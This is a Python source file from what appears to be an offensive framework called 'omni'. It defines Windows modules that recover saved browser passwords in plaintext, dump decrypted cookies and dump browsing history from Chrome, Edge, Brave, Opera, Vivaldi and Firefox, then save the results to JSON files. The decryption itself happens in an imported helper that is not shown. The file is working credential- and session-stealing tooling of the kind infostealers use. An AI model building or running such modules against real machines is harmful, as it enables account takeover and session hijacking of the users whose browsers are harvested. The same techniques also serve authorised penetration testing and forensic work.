"""Browser credential / cookie / history modules."""

from __future__ import annotations

import json

from omni.core import config, console
from omni.core.module import Module, Option
from omni.windows import browsers


class _BrowserModule(Module):
    FAMILY = "windows"
    OPTIONS = (Option("BROWSER", "chrome|edge|brave|opera|vivaldi|firefox",
                      "chrome", choices=("chrome", "edge", "brave", "opera",
                                         "vivaldi", "firefox")),)

    def save(self, rows: list[dict], name: str) -> str:
        path = f"{config.output_dir('windows')}/{name}.json"
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(rows, fh, indent=2)
        console.ok(f"{len(rows)} rows -> {path}")
        return path


class Logins(_BrowserModule):
    NAME = "windows.logins"
    DESCRIPTION = "Recover saved browser passwords (DPAPI/AES-GCM)"

    def execute(self) -> list[dict]:
        rows = browsers.collect(self.get("BROWSER"), "logins")
        console.table(["url", "username", "password"],
                      [[r["url"][:52], r["username"], r["password"] or "(locked)"]
                       for r in rows])
        self.save(rows, f"logins_{self.get('BROWSER')}")
        return rows


class Cookies(_BrowserModule):
    NAME = "windows.cookies"
    DESCRIPTION = "Dump decrypted browser cookies"

    def execute(self) -> list[dict]:
        rows = browsers.collect(self.get("BROWSER"), "cookies")
        self.save(rows, f"cookies_{self.get('BROWSER')}")
        return rows


class History(_BrowserModule):
    NAME = "windows.history"
    DESCRIPTION = "Dump browser history"
    OPTIONS = _BrowserModule.OPTIONS + (Option("LIMIT", "max rows", "500"),)

    def execute(self) -> list[dict]:
        rows = browsers.chromium_history(self.get("BROWSER"),
                                         self.get_int("LIMIT", 500))
        console.table(["visits", "url"], [[str(r["visits"]), r["url"][:70]]
                                          for r in rows[:40]])
        self.save(rows, f"history_{self.get('BROWSER')}")
        return rows
